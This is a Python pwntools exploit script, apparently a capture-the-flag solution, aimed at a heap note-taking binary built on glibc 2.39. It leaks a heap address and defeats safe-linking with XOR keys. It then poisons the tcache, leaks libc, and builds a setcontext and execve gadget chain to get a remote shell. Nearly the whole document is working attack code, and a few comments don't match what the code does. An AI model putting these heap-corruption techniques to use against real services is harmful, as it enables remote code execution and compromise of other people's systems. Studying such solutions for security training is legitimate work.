from pwn import *
import os

exe = ELF("./notezpz_patched")
libc = ELF("./libc6_2.39-0ubuntu8.6_amd64.so")
ld = ELF("./ld-linux-x86-64.so.2")
context.log_level = 'debug'
context.arch = 'amd64'
context.os  = 'linux'


context.binary = exe
context.terminal = ['tmux','split','-h']
def conn():
    if args.L:
        p = process([exe.path])
    else:
        p = remote(os.getenv("HOST", "127.0.0.1"), int(os.getenv("PORT", "8007")))
    return p
def dbg(p,bp=None):
    if bp is not None:
        gdb.attach(p, bp)
    else:
        gdb.attach(p)
    pause()

def create_question(p):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'C')

def ask_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'A')
    p.sendlineafter('Enter question id: ', str(qid))
    p.recvuntil("I have the answer perhaps: '")
def set_question(p, qid, content):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'S')
    p.sendlineafter('Enter question id: ', str(qid))
    p.sendlineafter('Enter your question: ', content)
def delete_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'd')
    p.sendlineafter('Enter question id: ', str(qid))

p=conn()

create_question(p)  # 创建问题0
create_question(p)  # 创建问题1
create_question(p)  # 创建问题2
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
create_question(p)
# debug(p)
delete_question(p, 2)  # 删除问题1 to avoid interference
create_question(p)  # 创建问题2
# pause()
# debug(p,'pie',0x0157E)
ask_question(p, 2)  # 触发对问题1的访问，泄露putchar地址
leak = p.recvuntil("'", drop=True)
heap_addr = u64(leak.ljust(8, b'\x00'))
heap_addr *= 0x1000
log.info("heap address: " + hex(heap_addr))


payload1= b'C' * 32  # 填充Q1内容缓冲区
payload1 += p64(0)+p64(0x31)+p64(heap_addr+0x2a0)  # 保持下一个堆块头部大小（0x21）
set_question(p, 0, payload1)  # 设置问题1的内容



# # #---------libcexploit-----------------
payload = b'A' * 32  # 填充Q0的内容缓冲区
payload += p64(0)+p64(0x421)+ b'B' * 32  # 覆盖Q1结构体的前32字节
payload += p64(heap_addr+0x2e0)  # 覆盖Q1的内容指针为heap地址+0x2e0
set_question(p, 3, payload)  # 设置问题3的内容
delete_question(p, 4)  # 删除问题2 to avoid interference
heap1=heap_addr+0x1360-0x1000+0x80+0x40+0x10
heap3=heap1+0x20-0xb0
key=heap_addr>>12
heap2=heap1^key
heap4=(heap3)^key
log.info("heap1 address: " + hex(heap1))



delete_question(p, 2)  # 删除问题2 to avoid interference

# # # debug(p)
payload = b'A' * 32  # 填充Q0的内容缓冲区
payload += p64(0)+p64(0x31)+ p64(heap2) # 覆盖Q1结构体的前32字节
log.info("heap1 address: " + hex(heap1))
set_question(p, 1, payload)
log.info("heap2 address: " + hex(heap2))
log.info("key: " + hex(key))

create_question(p)
ask_question(p, 2)
# libc1=u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc1 = u64(p.recv(6).ljust(8, b'\x00'))
log.info("libc1 " + hex(libc1))

libc_addr=libc1-0x203b20
log.info("libc_addr " + hex(libc_addr))
pop_rdi=libc_addr+0x10f78b
binsh=libc_addr+0x1CB42F
set_con=libc_addr+0x4AA4C
system_addr=libc_addr+libc.sym['system']
execve=libc_addr+0xef52b#0xef4ce   #
heap_5e0=heap_addr+0x5e0
mov_rdx=libc_addr+0x176f3e              #0x176f3e: mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20];

payload = b'B' * 40  # 填充Q0的内容缓冲区
payload += p64(0x31)+p64(mov_rdx)+b'B'*0x30+p64(heap_addr+0x630)         #+b'B' * 24+p64(heap_5e0)+ b'1'*8+b'/bin/sh\x00' # 覆盖Q1结构体的前32字节

set_question(p, 7, payload)


payload =p64(0x7777777777777777)*2+p64(set_con)+p64(0)*7+p64(heap_addr+0x6a0)+p64(binsh)
set_question(p, 9, payload)

paylaod = p64(0)+b'2' * 0x30+p64(execve)  # 填充Q0的内容缓冲区
set_question(p, 10, paylaod)

p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'A')
# dbg(p)
p.sendlineafter('Enter question id: ', '8')

p.interactive()
